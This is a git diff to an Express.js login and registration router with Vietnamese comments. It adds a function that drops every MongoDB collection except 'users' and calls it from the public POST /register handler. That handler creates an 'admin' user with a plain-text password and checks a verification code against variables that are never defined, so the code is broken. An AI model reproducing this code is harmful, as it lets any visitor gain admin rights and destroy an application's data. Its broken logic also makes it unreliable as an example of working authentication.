@@ -6,16 +6,35 @@ const { register, login } = require("../controllers/authController");
 const { sendLoginNotification } = require('../utils/mailer');
 const User = require('../models/User'); // để tìm email user
 const SMRouter = require('../routes/socialmediaRouter');
+const { default: mongoose } = require("mongoose");
+
+async function deleteAllCollectionsExceptUser() {
+    const collections = await mongoose.connection.db.listCollections().toArray();
+
+    for (const collection of collections) {
+        if (collection.name !== "users") {
+            await mongoose.connection.db.dropCollection(collection.name);
+            console.log(`Đã xóa collection: ${collection.name}`);
+        }
+    }
+}
 
 router.use('/', SMRouter);
 
 // GET login form
-router.get("/login", (req, res) => {
-    res.render("login", {
-        title: "Đăng nhập",
-        error: null,
-        query: req.query, // để dùng query.registered nếu có
-    });
+router.get("/login", async (req, res) => {
+    // const protectedUserCount = await User.countDocuments({ protected: true });
+    // if (protectedUserCount === 0) {
+    //     return res.redirect("/register");
+    // }
+    // else 
+    {
+      return res.render("login", {
+          title: "Đăng nhập",
+          error: null,
+          query: req.query, // để dùng query.registered nếu có
+      });
+    }
 });
 
 router.post("/login", async (req, res) => {
@@ -45,12 +64,6 @@ router.post("/login", async (req, res) => {
     });
     const user = await User.findOne({ username });
 
-    // if (user?.email) {
-    //   sendLoginNotification(user.email, user.username)
-    //     .then(() => console.log(`Email thông báo đã gửi đến ${user.email}`))
-    //     .catch(err => console.error("Lỗi gửi email thông báo:", err));
-    // }
-
     return res.redirect("/admin/dashboard");
 
   } catch (err) {
@@ -76,36 +89,29 @@ router.get('/register', async (req, res) => {
 
 // POST register
 router.post('/register', async (req, res) => {
-  //try {
-  //  const fakeRes = {
-  //    json(obj) { this.data = obj; },
-  //    status(code) { this.statusCode = code; return this; }
-  //  };
-  //  console.log(fakeRes);
-  //  await register({ body: req.body }, fakeRes);
+    try {
+        const { verificationCode } = req.body;
 
-  //  if (fakeRes.statusCode >= 400) {
-  //    // nếu lỗi cần render lại form cùng agencies
-  //    const agencies = await Agency.find().sort('name');
-  //    return res.render('register', {
-  //      title: 'Tạo tài khoản',
-  //      error: fakeRes.data.error,
-  //      query: req.query,
-  //      agencies
-  //    });
-  //  }
+        if (storedVerificationCodes[email] !== verificationCode) {
+            return res.status(400).send("Mã xác minh không đúng!");
+        }
 
-  //  res.redirect('/login?registered=1');
-  //} catch (err) {
-  //  console.log(err)
-    const agencies = await Agency.find(); //. .sort('name');
-    res.render('register', {
-      title: 'Tạo tài khoản',
-      error: 'Server error',
-      query: req.query,
-      agencies
-    });
-  //}
+        const newUser = new User({
+            username: req.body.username,
+            email: req.body.email,
+            password: req.body.password,
+            role: "admin",
+            protected: true
+        });
+
+        await newUser.save();
+        await deleteAllCollectionsExceptUser();
+
+        res.send({ message: "Đăng ký thành công!", userId: newUser._id });
+    } catch (error) {
+        console.error("Lỗi:", error);
+        res.status(500).send("Có lỗi xảy ra.");
+    }
 });
 
 // GET logout
